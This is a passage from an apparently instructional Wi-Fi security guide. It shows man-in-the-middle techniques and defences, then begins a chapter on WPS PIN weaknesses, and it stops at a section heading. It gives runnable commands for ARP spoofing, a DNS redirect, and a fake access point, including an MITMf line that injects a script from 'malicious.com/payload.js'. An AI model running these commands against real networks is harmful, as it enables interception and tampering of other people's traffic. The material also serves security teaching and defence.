- fmt: "\nWireshark is a packet analysis tool that can be used to capture and analyze\
    \ network traffic intercepted in a MITM attack.\n\n## Installation\n```bash\n\
    sudo apt install wireshark\n```\n\n## Functionalities\n- Packet capture and analysis\n\
    - Advanced filters to isolate specific traffic\n- Support for hundreds of network\
    \ protocols\n\n# MITMf (Man-in-the-Middle Framework)\n\nMITMf is an extensible\
    \ framework for MITM attacks, offering a wide range of plugins for various attack\
    \ techniques.\n\n- **Installation**: MITMf can be installed from the source code\
    \ available on GitHub.\n\n## Repository Cloning\n```bash\ngit clone https://github.com/byt3bl33d3r/MITMf\n\
    cd MITMf\nsudo python setup.py install\n```\n\n- **Execution**: MITMf can be used\
    \ for ARP spoofing attacks, DNS redirection, code injection, and more.\n\n## Example\
    \ of use\n```bash\nsudo mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.2\
    \ --inject --js-url http://malicious.com/payload.js\n```\nThis command performs\
    \ an ARP spoofing attack by redirecting the victim's traffic and injecting a malicious\
    \ JavaScript script.\n\n# Prevention and Detection\n\nProtecting Wi-Fi networks\
    \ against MITM attacks requires a combination of best security practices, monitoring\
    \ tools, and user education. The following are some effective strategies for preventing\
    \ and detecting MITM attacks.\n\n## Using HTTPS\nUsing HTTPS to encrypt traffic\
    \ between the client and server is one of the most effective ways to protect against\
    \ MITM attacks. HTTPS ensures that transmitted data is encrypted, making it useless\
    \ to an attacker who manages to intercept it.\n\n- **SSL/TLS certificates**: Ensure\
    \ that all websites and web services use valid SSL/TLS certificates to ensure\
    \ traffic encryption.\n\n## VPN implementation\nUsing virtual private networks\
    \ (VPNs) can protect data transmitted over insecure, public Wi-Fi networks. A\
    \ VPN creates an encrypted tunnel between the user's device and the VPN server,\
    \ protecting data from interception.\n\n- **VPN Services**: There are several\
    \ VPN services available such as NordVPN, ExpressVPN and others that can be configured\
    \ to secure network traffic.\n\n## Network Segmentation\nSegmenting the network\
    \ can limit the impact of a MITM attack. For example, isolating critical devices\
    \ into a separate VLAN can help protect those devices from attacks that target\
    \ the overall network.\n\n- **Use of VLANs**: Configure VLANs on the router and\
    \ switches to isolate different types of traffic and devices.\n\n## Network Monitoring\n\
    Implementing network monitoring systems can help detect suspicious activity such\
    \ as ARP spoofing and DNS redirection, enabling rapid response to MITM attacks.\n\
    \n- **Intrusion Detection Systems (IDS)**: Tools like `Snort` or `Zeek` can be\
    \ configured to monitor network traffic and alert you to suspicious activity.\n\
    \n## Configuring ARP Spoofing Protection\nSome routers and switches offer protection\
    \ against ARP spoofing. Enabling these settings can help prevent MITM attacks\
    \ based on ARP spoofing.\n\n- **Configuration on the Router**: Access the router's\
    \ administration interface and enable ARP spoofing protection, if available.\n\
    \n## User Education\nEducating users about security risks and best practices can\
    \ help prevent MITM attacks. Teach users to check the websites they visit for\
    \ HTTPS and to be wary of unknown Wi-Fi access points.\n\n- **Good Security Practices**:\n\
    \    - Check the presence of HTTPS on the websites you access.\n    - Do not connect\
    \ to unknown Wi-Fi hotspots.\n    - Use VPNs when accessing public Wi-Fi networks.\n\
    \n# Practical Examples of Execution and Defense\n\n## Performing ARP Spoofing\
    \ with Ettercap\n\n### Install and Start Ettercap\n```bash\nsudo apt install ettercap-graphical\n\
    sudo ettercap -G\n```\n- **Select Network Interface and Start Sniffing**: Select\
    \ the network interface used and click \"Start Sniffing\".\n- **Add Victims and\
    \ Perform ARP Spoofing**: Add the router's IP address as a victim and the target\
    \ device's IP address as another victim. Select \"ARP poisoning\" and start the\
    \ attack.\n\n## Performing DNS Redirection with Dnsmasq\n\n### Install Dnsmasq\n\
    ```bash\nsudo apt install dnsmasq\n```\n- **Configure DNS Redirection**: Edit\
    \ the file `/etc/dnsmasq.conf` and add entries for DNS redirection:\n```text\n\
    address=/example.com/192.168.1.100\n```\n- **Start Dnsmasq**:\n```bash\nsudo systemctl\
    \ restart dnsmasq\n```\n\n## Creating Fake Access Point with Airbase-ng\n\n###\
    \ Put the Interface in Monitor Mode\n```bash\nsudo airmon-ng start wlan0\n```\n\
    \n### Create the Fake Access Point\n```bash\nsudo airbase-ng -e \"NomeDoSSID\"\
    \ wlan0mon\n```\n\n## ARP Spoofing Protection Implementation\n1. **Configure Protection\
    \ on the Router**: Access the router's administration interface and navigate to\
    \ the security settings. Enable ARP spoofing protection, if available.\n2. **Use\
    \ of Monitoring Tools**: Install and configure monitoring tools like `Snort` or\
    \ `Zeek` to detect and alert on ARP spoofing activities.\n\n## VPN Configuration\n\
    1. **Choose a VPN Service**: Sign up for a reliable VPN service like NordVPN or\
    \ ExpressVPN.\n2. **VPN Client Configuration**: Follow your VPN provider's instructions\
    \ to install and configure the VPN client on your device.\n3. **Connect to VPN**:\
    \ Connect to VPN whenever you access public or unsecured Wi-Fi networks.\n\nMan-in-the-Middle\
    \ attacks pose a significant threat to Wi-Fi networks, allowing attackers to intercept\
    \ and modify communications without being detected. Understanding the techniques\
    \ for executing these attacks, such as ARP spoofing, DNS redirection, and creating\
    \ fake access points, is crucial for cybersecurity professionals. Tools like `Ettercap`,\
    \ `Wireshark`, and `MITMf` make it easier to execute these attacks, but there\
    \ are also effective prevention and detection strategies, including the use of\
    \ HTTPS, VPNs, network segmentation, continuous monitoring, and user education.\
    \ Practical application of these defense techniques helps protect Wi-Fi networks\
    \ against the persistent threat of MITM attacks, ensuring data security and communications\
    \ integrity.\n\n# Chapter 7: WPS Vulnerability Exploitation\n\n## What is WPS\
    \ and Its Vulnerabilities\nWi-Fi Protected Setup (WPS) is a feature that was introduced\
    \ to make it easier to set up secure Wi-Fi networks, especially for home users.\
    \ The main idea of ​​WPS is to simplify the process of connecting new devices\
    \ to a Wi-Fi network without having to manually enter the security key. There\
    \ are several methods for using WPS, including using an eight-digit PIN, a physical\
    \ button on the router (push-button), and NFC (Near Field Communication) methods.\n\
    \n## How WPS works\nWPS works through an authentication process that aims to simplify\
    \ connecting to a Wi-Fi network. Here are the most common methods:\n\n- **Eight-Digit\
    \ PIN**: An eight-digit numeric PIN is used to connect devices to the network.\
    \ This PIN is usually printed on the router or displayed in the configuration\
    \ interface.\n- **Push-Button (PBC)**: Pressing a physical button on both the\
    \ router and the client device to establish a connection.\n- **Near Field Communication\
    \ (NFC)**: Touch the device to the router to connect automatically (less common).\n\
    \n## WPS Vulnerabilities\nDespite the convenience offered by WPS, it has several\
    \ significant vulnerabilities, especially in the PIN authentication method:\n\n\
    - **Brute Force PIN Attack**: The eight-digit PIN is vulnerable to brute force\
    \ attacks. Because the PIN is divided into two four-digit halves, an attacker\
    \ only needs to guess 10,000 combinations for the first half and 1,000 for the\
    \ second, totaling 11,000 attempts at most.\n- **Predictable PIN**: Some routers\
    \ generate predefined or easily predictable PINs, which makes attacks even easier.\n\
    - **Implementation Failures**: Several implementations of WPS in routers contain\
    \ flaws that can be exploited by attackers.\n\n## WPS Exploitation Methods\nThere\
    \ are several techniques and tools that allow the exploitation of WPS vulnerabilities\
    \ to compromise the security of a Wi-Fi network. The most common and effective\
    \ is the WPS PIN brute force attack.\n\n# Brute Force Attack on WPS PIN\n"
